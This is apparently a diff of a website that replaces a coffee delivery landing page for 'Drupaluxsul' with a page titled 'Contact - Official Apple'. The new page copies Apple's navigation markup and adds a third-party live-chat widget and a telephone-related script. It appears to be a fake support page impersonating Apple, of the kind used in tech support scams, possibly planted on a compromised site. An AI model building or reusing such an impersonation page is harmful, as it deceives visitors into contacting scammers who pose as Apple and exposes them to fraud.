@@ -1,1277 +1,379 @@
-
-
-
-<!DOCTYPE html>
-<html>
-  
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width" />
-    <title>Drupaluxsul — Freshly Brewed Coffee, Delivered by  Drupaluxsul </title>
-    <meta property="og:title" content="Drupaluxsul — Freshly Brewed Coffee, Delivered by  Drupaluxsul " />
-    <meta property="og:image" content="thumbnails/coffee_tea_2ab3b_1.jpg" />
-    
-    <meta property="og:description" content="At Drupaluxsul , we believe a truly good cup of coffee should arrive fresh, aromatic, and ready to enjoy&mdash;without requiring..." />
-    <meta name="description" content="At Drupaluxsul , we believe a truly good cup of coffee should arrive fresh, aromatic, and ready to enjoy&mdash;without requiring..." />
-    <meta name="twitter:title" content="Drupaluxsul — Freshly Brewed Coffee, Delivered by  Drupaluxsul ">
-    <meta name="twitter:image:src" content="thumbnails/coffee_tea_2ab3b_1.jpg"/>
-
-    <script src="resource-dir/js/jquery-3.7.1.min.js"></script>
-    <script src="resource-dir/js/bootstrap.js"></script>
-
-
-    <link rel="stylesheet" href="resource-dir/css/bootstrap.css" />
-    <link rel="stylesheet" href="resource-dir/css/bootstrap-icons.css" />
-     
-    <link rel="shortcut icon" href="logo-icon.png" type="image/x-icon" />
- 
-    <link href="https://fonts.googleapis.com/css2?family=Teachers:ital,wght@0,400..800;1,400..800&display=swap" rel="stylesheet" />
-    <link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@200..900&display=swap" rel="stylesheet" />
-    <style>
-
-      body{
-        direction: ltr;
-        font-family: 'Teachers', sans-serif !important;
-        font-size: 16px;
-        margin: 0;
-        padding: 0px;
-      }
-
-      h1, h2, h3, h4{
-        margin: 0;
-      }
-
-      button span{
-        font-size:  inherit;
-        line-height: 1.4;
-      }
-      .content-block {
-        word-break: break-all;
-        padding: 109px 0;
-    }
-
-    .content-block li {
-      list-style: disc;
-      margin: 0 20px;
-      padding:  6px 0;
-    }
-    .content-block p {
-      padding:  6px 0;
-    }
-      p{
-        font-size:  inherit;
-        margin-bottom: 20px;
-      }
-
-      a{
-        text-decoration: none;
-        font-size:  inherit;
-      }
-
-      img{
-        width: 100%;
-        display: block;
-      }
-
-      li{
-        list-style: none;
-      }
-
-      ul{
-        padding: 0;
-        margin: 0;
-      }
-
-      .map-box iframe{
-        height: 100%;
-      }
-
-      .section{
-        padding-top: 78px;
-        padding-bottom: 78px;
-      }
-
-      .title{
-        text-align: center;
-        font-size: 28px;
-        font-weight: 400;
-        line-height: 1.4;
-        margin-bottom: 25px;
-      }
-
-      .text{
-        font-size:  16px;
-        font-weight: 400;
-        text-align: center;
-        line-height: 1.4;
-        margin-bottom: 20px;
-      }
-
-      .logo{
-         display: flex;
-         gap: 11px;
-         align-items: center;
-      }
-
-      .logo img{
-         max-width: 50px;
-      }
-
-      .logo h2{
-        margin: 0;
-        font-size: 25px;
-      }
-
-      .collapse button{
-          padding: 11px;
-      }
-
-      .navbar-toggler {
-        background-image: linear-gradient(to bottom, #00acb0, #00a9b6, #00a5bc, #00a1c1, #009dc4);
-      }
-
-      .navbar-toggler:focus,
-      .navbar-toggler:hover {
-        box-shadow: none;
-      }
-
-      .bi-justify{
-        transition: fill 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-      }
-
-      .bi-justify:hover,
-      .bi-justify:focus{
-        fill: #7a2381;
-      }
-
-      .navbar{
-          padding-top: calc((100px - 60px) / 2);
-          padding-bottom: calc((100px - 60px) / 2);
-      }
-
-      .navbar-toggler:active{
-        outline: none;
-      }
-
-      .navbar-nav{
-          gap: 11px;
-          display: flex;
-          justify-content: center;
-          align-items: center;
-      }
-
-      .nav-link {
-          text-transform: capitalize;
-          padding-left: 15px;
-          padding-right: 15px;
-          transition: box-shadow 1000ms cubic-bezier(0.075, 0.82, 0.165, 1),  color 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-      }
-
-      .nav-link:hover,
-      .nav-link:focus{
-        box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-        color: #7a2381;
-      }
-
-      .button-1 {
-          align-items: center;
-          background-color: #FFFFFF;
-          border: 1px solid rgba(0, 0, 0, 0.1);
-          border-radius: .25rem;
-          box-shadow: rgba(0, 0, 0, 0.02) 0 1px 3px 0;
-          box-sizing: border-box;
-          color: rgba(0, 0, 0, 0.85);
-          cursor: pointer;
-          display: inline-flex;
-          font-family: system-ui,-apple-system,system-ui,"Helvetica Neue",Helvetica,Arial,sans-serif;
-          font-size: 16px;
-          font-weight: 400;
-          justify-content: center;
-          line-height: 1.25;
-          margin: 0;
-          min-height: 3rem;
-          padding: calc(.875rem - 1px) calc(1.5rem - 1px);
-          position: relative;
-          text-decoration: none;
-          transition: all 250ms;
-          user-select: none;
-          -webkit-user-select: none;
-          touch-action: manipulation;
-          vertical-align: baseline;
-          width: auto;
-      }
-
-      .button-1:hover,
-      .button-1:focus {
-          border-color: rgba(0, 0, 0, 0.15);
-          box-shadow: rgba(0, 0, 0, 0.1) 0 4px 12px;
-          color: rgba(0, 0, 0, 0.65);
-      }
-
-      .button-1:hover {
-          transform: translateY(-1px);
-      }
-
-      .button-1:active {
-          background-color: #F0F0F1;
-          border-color: rgba(0, 0, 0, 0.15);
-          box-shadow: rgba(0, 0, 0, 0.06) 0 2px 4px;
-          color: rgba(0, 0, 0, 0.65);
-          transform: translateY(0);
-      }
-
-      .button-2 {
-          background: #FF4742;
-          border: 1px solid #FF4742;
-          border-radius: 6px;
-          box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;
-          box-sizing: border-box;
-          color: #FFFFFF;
-          cursor: pointer;
-          display: inline-block;
-          font-family: nunito,roboto,proxima-nova,"proximasans-serif";
-          font-size: 16px;
-          font-weight: 400;
-          line-height: 16px;
-          min-height: 40px;
-          outline: 0;
-          padding: 12px 14px;
-          text-align: center;
-          text-rendering: geometricprecision;
-          text-transform: none;
-          user-select: none;
-          -webkit-user-select: none;
-          touch-action: manipulation;
-          vertical-align: middle;
-      }
-
-      .button-2:hover,
-      .button-2:active {
-          background-color: initial;
-          background-position: 0 0;
-          color: #FF4742;
-      }
-
-      .button-2:active {
-          opacity: .5;
-      }
-
-      .button-3 {
-          background-color: #c2fbd7;
-          border-radius: 100px;
-           box-shadow: rgba(44, 187, 99, .2) 0 -25px 18px -14px inset,rgba(44, 187, 99, .15) 0 1px 2px,rgba(44, 187, 99, .15) 0 2px 4px,rgba(44, 187, 99, .15) 0 4px 8px,rgba(44, 187, 99, .15) 0 8px 16px,rgba(44, 187, 99, .15) 0 16px 32px;
-          color: green;
-          cursor: pointer;
-          display: inline-block;
-          font-family: CerebriSans-Regular,-apple-ssystem-ui,Roboto,sans-serif;
-          padding: 7px 20px;
-          text-align: center;
-          text-decoration: none;
-          transition: all 250ms;
-          border: 0;
-          font-size: 16px;
-          user-select: none;
-          -webkit-user-select: none;
-          touch-action: manipulation;
-      }
-
-      .button-3:hover {
-          box-shadow: rgba(44,187,99,.35) 0 -25px 18px -14px inset,rgba(44,187,99,.25) 0 1px 2px,rgba(44,187,99,.25) 0 2px 4px,rgba(44,187,99,.25) 0 4px 8px,rgba(44,187,99,.25) 0 8px 16px,rgba(44,187,99,.25) 0 16px 32px;
-          transform: scale(1.05) rotate(-1deg);
-      }
-
-      .button-4 {
-          background-image: linear-gradient(-180deg, #37AEE2 0%, #1E96C8 100%);
-          border-radius: .5rem;
-          box-sizing: border-box;
-          color: #FFFFFF;
-          display: flex;
-          font-size: 16px;
-          justify-content: center;
-          padding: 1rem 1.75rem;
-          text-decoration: none;
-          border: 0;
-          cursor: pointer;
-          user-select: none;
-          -webkit-user-select: none;
-          touch-action: manipulation;
-       }
-
-      .button-4:hover {
-          background-image: linear-gradient(-180deg, #1D95C9 0%, #17759C 100%);
-      }
-
-      @media (min-width: 768px) {
-          .button-4 {
-              padding: 1rem 2rem;
-          }
-      }
-
-      .button-5 {
-          align-self: center;
-          background-color: #fff;
-          background-image: none;
-          background-position: 0 90%;
-          background-repeat: repeat no-repeat;
-          background-size: 4px 3px;
-          border-radius: 15px 225px 255px 15px 15px 255px 225px 15px;
-          border-style: solid;
-          border-width: 2px;
-          box-shadow: rgba(0, 0, 0, .2) 15px 28px 25px -18px;
-          box-sizing: border-box;
-          color: #41403e;
-          cursor: pointer;
-          display: inline-block;
-          font-family: Neucha, sans-serif;
-          font-size: 1rem;
-          line-height: 23px;
-          outline: none;
-          padding: .75rem;
-          text-decoration: none;
-          transition: all 235ms ease-in-out;
-          border-bottom-left-radius: 15px 255px;
-          border-bottom-right-radius: 225px 15px;
-          border-top-left-radius: 255px 15px;
-          border-top-right-radius: 15px 225px;
-          user-select: none;
-          -webkit-user-select: none;
-          touch-action: manipulation;
-      }
-
-
-      .button-5:hover {
-          box-shadow: rgba(0, 0, 0, .3) 2px 8px 8px -5px;
-          transform: translate3d(0, 2px, 0);
-      }
-
-      .button-5:focus {
-          box-shadow: rgba(0, 0, 0, .3) 2px 8px 4px -6px;
-      }
-
-      .hero{
-          margin-top: -100px;
-          background: linear-gradient(to bottom, #00acb0, #00a9b6, #00a5bc, #00a1c1, #009dc4);
-          color: #ffffff;
-          position: relative;
-          animation: bgi 10s infinite;
-          background-size: 400% 400%;
-          padding-top: Calc(200px + 78px);
-      }
-
-
-      @keyframes bgi {
-          0%   {background-position: 0% 0%;}
-          25%  {background-position: 100% 100%;}
-          50%  {background-position: 0% 0%;}
-          75%  {background-position: 100% 100%;}
-          100% {background-position: 0% 0%;}
-      }
-
-      .hero-title{
-          font-size:  25px;
-          font-weight: 400;
-          line-height: 1.4;
-          margin-bottom: 109px;
-          text-align: center;
-      }
-
-      .hero-title-box{
-        text-align: end;
-      }
-
-      .hero-img{
-          width: 241px;
-          position: relative;
-          animation: animation-xs 7s infinite;
-      }
-
-      @keyframes animation-xs {
-          0%   {top: 0px; right: 0px;}
-          25%  {top: 10px; right: 0px;}
-          50%  {top: 0px; right: 0px;}
-          75%  {top: 10px; right: 0px;}
-          100% {top: 0px; right: 0px;}
-      }
-
-      .partners-box img{
-          width: 116px;
-      }
-
-      .partners-box{
-          background-color: #9f9fa65c;
-          padding-top:  78px;
-          padding-bottom:  78px;
-      }
-
-      .partners-img{
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          gap: 22px;
-          flex-wrap: wrap;
-      }
-
-      .fl-box{
-        display: flex;
-        flex-direction: column-reverse;
-      }
-
-      .main-wrapper{
-          display: flex;
-          justify-content: center;
-          align-items: center;
-          margin-bottom: 20px;
-      }
-
-      .main-description p{
-          font-size:  16px;
-          line-height: 1.4;
-          margin-bottom: 20px:
-      }
-
-      .price{
-      font-size:  28px;
-      color: #7a2381;
-      }
-
-      .how-work-list{
-        gap: 20px;
-        flex-direction: column-reverse;
-        display: flex;
-        flex-wrap: wrap;
-      }
-
-      .how-work-item{
-        display: flex;
-        justify-content: stretch;
-        flex-direction:  column-reverse;
-        align-items: center;
-        text-align: center;
-        padding: 22px;
-        box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-        flex: 1;
-      }
-
-      .how-work-svg{
-        fill: #7a2381;
-        width: 50px;
-        height: 50px;
-        margin-bottom: 20px;
-      }
-
-      .advantages-box p{
-        text-align: center;
-      }
-
-      .advanteges-text{
-        font-size: 20px;
-        font-weight:400;
-      }
-
-      .reviews-title{
-        margin-bottom:  45px;
-      }
-
-      .reviews-list{
-        gap: 20px;
-        display: flex;
-        flex-wrap: wrap;
-      }
-
-      .reviews-item{
-        outline: 3px solid #7a2381;
-        padding-top:  45px;
-        padding-bottom:  45px;
-        padding-left: 22px;
-        padding-right: 22px;
-        position: relative;
-        border-radius: 5px;
-        flex: 1;
-      }
-
-       .reviews-item:last-child{
-        display: none;
-       }
-
-      .svg-box{
-        width: 50px;
-        height: 50px;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background-color: #7a2381;
-        border-radius: 50%;
-        position: absolute;
-        top: -40px;
-        left: 15px;
-        transform: rotate(180deg);
-      }
-
-      .reviews-svg{
-        width: 40px;
-        height: 40px;
-        fill: #ffffff;
-      }
-
-       .avatar-box {
-        display: flex;
-        align-items: center;
-        position: absolute;
-        bottom: 15px;
-        left: 22px;
-       }
-
-      .avatar-box img{
-        width: 40px;
-        border-radius: 50%;
-        margin-right: 10px;
-        display: none;
-      }
-
-      .avatar-box h3{
-        font-size: 16px;
-        color: #7a2381;
-      }
-
-
-      .contact-form{
-          margin: 0 auto;
-          box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-          border-radius: 5px;
-          text-align: end;
-          padding: 22px;
-          flex: 1;
-        }
-
-        .map-box{
-          flex: 1;
-          height: 445px;
-          border-radius: 5px;
-          box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-          padding: 22px;
-        }
-
-        .contact-wrapper{
-          gap: 10px;
-          display: flex;
-          flex-direction: column;
-          margin-bottom: 6px;
-        }
-        .input-inputsection-section{
-            display: block;
-            width: 100%;
-            padding: 0.375rem 0.75rem;
-            font-size: 1rem;
-            font-weight: 400;
-            line-height: 1.4;
-            color: #212529;
-            background-color: #fff;
-            background-clip: padding-box;
-            border: 1px solid #ced4da;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            appearance: none;
-            border-radius: 0.25rem;
-            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
-        }
-        .textarea-inputsection-section{
-           width: 100%;
-            border: 1px solid #ced4da;
-            border-radius: 0.25rem;
-            padding: 0.375rem 0.75rem;
-        }
-        .contact-input{
-          padding: 7px;
-        }
-
-        .contact-text{
-          margin: 0;
-          text-align: start;
-        }
-
-        .contact-btn{
-          margin-top:  20px;
-        }
-        .main-img {
-          object-fit: contain;
-          width: 100%;
-          height:481px;
-        }
-        .footer{
-            padding-bottom: 0 !important;
-        }
-
-          .logo-box{
-            gap: 15px;
-          }
-
-
-          .footer{
-            padding-top: 0 !important;
-          }
-
-          .footer-wrapper .logo{
-            align-items: flex-start;
-            padding-top: 27px;
-            justify-content: center;
-          }
-
-          .footer-contacts{
-            padding: 26px;
-         }
-
-          .footer-list{
-            list-style: none;
-            margin: 0;
-            padding: 0;
-            text-align: end;
-          }
-
-          .footer-item{
-            margin-bottom: 26px;
-          }
-
-          .footer-item a{
-            word-break: break-all;
-            text-decoration: none;
-            color: inherit;
-          }
-
-          .footer:last-child{
-            margin-bottom: 0;
-          }
-
-          .footer-called{
-            color: #7a2381;
-            margin-bottom: 2px;
-          }
-
-          .footer-privacy-wrapper{
-            padding-top: 20px;
-            padding-bottom: 20px;
-            box-shadow: 0px 50px 100px -20px rgba(50, 50, 93, 0.15), 0px 30px 60px -30px rgba(0, 0, 0, 0.2), inset 0px -2px 6px 0px rgba(10, 37, 64, 0.25);
-            margin-top: 20px;
-            display: flex;
-            justify-content: space-around;
-            gap:  20px;
-          }
-
-          .footer-privacy{
-            color: #828080;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-decoration: none;
-
-            transition: color 300ms cubic-bezier(0.075, 0.82, 0.165, 1);
-          }
-
-          .footer-privacy:hover,
-          .footer-privacy:focus{
-            color: #7a2381;
-          }
- 
- 
-      @media (min-width: 768px){
-        .section{
-          padding-top: 93px;
-          padding-bottom: 93px;
-        }
-
-          .title{
-              margin-bottom:  26px;
-          }
-
-          .hero-title{
-              font-size:  28px;
-              font-weight: 400;
-              line-height: 1.4;
-              margin-bottom: 109px;
-          }
-
-          .hero-btn{
-            margin-bottom: 65px;
-          }
-
-          .bg-img{
-              position: absolute;
-              transform: rotate(180deg);
-              fill: white;
-              overflow: hidden;
-              left: 0;
-              bottom: -1px;
-              width: 100%;
-              line-height: 0;
-              direction: ltr;
-          }
-
-
-          .hero-img{
-              width: 300px;
-              animation: animation 7s infinite;
-          }
-
-          @keyframes animation {
-              0%   {top: 0px; right: 0px;}
-              25%  {top: 20px; right: 20px;}
-              50%  {top: 0px; right: 0px;}
-              75%  {top: 20px; right: 20px;}
-              100% {top: 0px; right: 0px;}
-          }
-
-          .advantages-box{
-            padding: 30px;
-            display: flex;
-            gap: 20px;
-            justify-items: center;
-            align-items: center;
-            flex-direction: row-reverse;
-          }
-
-          .advantages-box img{
-            min-width: 300px;
-          }
-
-          .advantages-box p{
-            min-width: calc(100% / 2);
-          }
-
-          .reviews-title{
-            margin-bottom: 60px;
-          }
-
-          .form-box{
-            display: flex;
-            justify-content: center;
-            gap: 6px;
-          }
-
-          .contact-form{
-            padding: 36px;
-          }
-
-          .contact-wrapper{
-            margin-bottom: 6px;
-          }
-
-          .contact-text{
-            text-align: end;
-            margin-right: 15px;
-          }
-
-          .footer{
-            padding-top: 0;
-          }
-
-          .footer-contacts{
-            text-align: end;
-            display: flex;
-            align-items: center;
-          }
-
-          .footer-wrapper{
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-          }
-
-          .footer-wrapper .logo{
-            flex: 1;
-          }
-
-          .footer-contacts{
-            flex: 1;
-          }
-
-      }
-      .hero{
-            padding-top: Calc(200px + 93px) !important;
-          }
-      @media(max-width: 767px){
-        .main-img {
-          height: auto;
-        }
-          .bg-img{
-              display: none;
-          }
-
-
-
-          .advantages-box-s{
-            display: flex;
-            flex-wrap: wrap;
-            flex-direction: column-reverse;
-          }
-
-          .reviews-item{
-            margin-bottom: 40px;
-          }
-
-          .reviews-list{
-            flex-direction: column;
-          }
-
-          .contact-form{
-            margin-bottom: 6px;
-          }
-           .footer-privacy-wrapper{
-            flex-direction: column;
-          }
-      }
-
-      @media(min-width: 992px){
-          .navbar{
-              padding-top: calc((100px - 60px) / 2);
-              padding-bottom: calc((100px - 60px) / 2);
-          }
-
-          .collapse{
-              padding: 0;
-          }
-
-          .hero-box{
-              flex-direction: row-reverse;
-              z-index: 999;
-              position: relative;
-          }
-
-          .content__block{
-              display: flex;
-              gap: 39px;
-              flex-direction: column-reverse;
-          }
-
-          .content__block > div{
-              flex: 1;
-          }
-
-          .reviews-title{
-            margin-bottom: 60px;
-          }
-
-      }
-
-      @media(max-width: 991px){
-          .hero-box{
-              flex-direction: column-reverse;
-          }
-
-          .content__block{
-            flex-direction: column !important;
-          }
-      }
-
-      @media(min-width: 1024px){
-          .section{
-              padding-top: 93px;
-              padding-bottom: 93px;
-          }
-
-        
-          .svg-box{
-            width: 70px;
-            height: 70px;
-          }
-
-          .reviews-svg{
-            width: 50px;
-            height: 50px;
-          }
-
-          .contact-wrapper{
-            grid-template-columns: 0.6fr 1.4fr;
-          }
-      }
-    </style>
-    
-  </head>
-
-  <body>
-    
-    <section class="header fixed-top">
-      <nav class="navbar navbar-expand-lg bg-body-tertiary">
-        <div class="container-fluid container">
-          <div class="logo col-3">
-            <img src="logo-icon.png" alt="" />
-            <h2>Drupaluxsul</h2>
-          </div>
-
-          <button
-            class="navbar-toggler"
-            type="button"
-            data-bs-toggle="collapse"
-            data-bs-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent"
-            aria-expanded="false"
-            aria-label="Toggle navigation"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              width="30"
-              height="30"
-              fill="#fff8ff"
-              class="bi bi-justify"
-              viewBox="0 0 16 16"
-            >
-              <path
-                fill-rule="evenodd"
-                d="M2 12.5a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5zm0-3a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5z"
-              />
-            </svg>
-          </button>
-
-          <div
-            class="collapse navbar-collapse text-center"
-            id="navbarSupportedContent"
-          >
-            <ul class="navbar-nav me-auto ms-auto mb-2 mb-lg-0">
-              <li>
-                <a class="nav-link" href="./#home">Home</a>
-              </li>
-              <li>
-                <a class="nav-link" href="./#about-us">About us</a>
-              </li>
-              
-              <li>
-                <a class="nav-link" href="./#reviews">Comments</a>
-              </li>
-              
-              
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+	<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-TI-_ABfYHKQY1aReo2_Yy.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
             </ul>
-
-            
-          </div>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </nav>
-    </section>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-    
-    <section class="section hero" id="home">
-      <div class="container">
-        <div class="row hero-box">
-          <div class="col hero-title-box">
-            <h3 class="hero-title">Drupaluxsul is dedicated to delivering freshly brewed coffee directly to your home or office, ensuring that every cup you enjoy is rich in flavor and aroma. We believe that great coffee enhances your day, so we use only the finest beans and expert brewing techniques to bring the café experience to your doorstep. Whether you need a morning boost or an afternoon pick-me-up, our service is designed to provide convenience and quality. Our team is passionate about coffee culture and committed to fast, reliable delivery that fits your schedule. Choose Drupaluxsul for a seamless coffee experience that energizes your day without leaving your space.</h3>
-
-            
-          </div>
-
-          <div
-            class="col d-flex align-items-center justify-content-center mb-3 mt-3"
-          >
-            <img class="hero-img" src="uploads/svg_2026-08-17_08-28-270.png" alt="" />
-          </div>
-        </div>
-      </div>
-
-      <div class="bg-img">
-        <svg
-          xmlns="http://www.w3.org/2000/svg"
-          viewBox="0 0 4185 400"
-          preserveAspectRatio="none"
-        >
-          <path
-            class="elementor-shape-fill ha-shape-divider"
-            opacity="0.2"
-            d="M435.6,210.9c71.5,82.4,274,177.3,402,23.3c90.1-108.4,182,36,330-10c262.3-81.5,270,96,394,98
-            c80,1.3,124.4-55.2,141.9-91.1c14.8-30.3,45.9-74.2,92.3-74.2c75,0,107.3,53.8,178.8,69.8c71.5,16,168.3-22.1,241.3,2.2
-            c73,24.3,113.2,59,140.8,102.1s59.6,55.2,101.3,46.4c41.7-8.8,66.3-52.4,71.5-73.4c3.9-15.8,10.7-52.7,34.8-69
-            c85.8-57.9,155.3-8.7,359.3,75.3c204,84,190,0,278-88c57.3-57.3,147-111.7,221.9-51.9c33.8,27,46.8,69.5,80.6,97.7
-            c32.9,27.5,74.7,44.7,117.7,46.4c14.6,0.6,29.6-0.6,42.9-6.6c26.8-12.1,30.7-34.9,24-61c-3.5-13.6-7.6-28-3.6-41.5
-            c16.3-54.4,116.7,8.5,141.5,23.5c47,28.4,99.3,68.2,156.9,67.4c62-0.9,115.2-95.8,180.7-114.3c12.1-3.4,20.6-14.3,20.6-26.9V0
-            L1270.5,0L0,0l0,132.1c0,14.1,7.6,27.2,20.1,33.8C134.4,226.5,285.9,38.3,435.6,210.9z M3011.4,197.5c38.4-15.6,72-43.5,113.2-51.7
-            c6.1-1.2,13.3-1.7,17.6,2.8c2.7,2.7,3.3,6.6,2.6,10.3c-0.6,3.4-2.4,6.8-4.8,9.3c-5,5.2-12,8-18.1,11.9
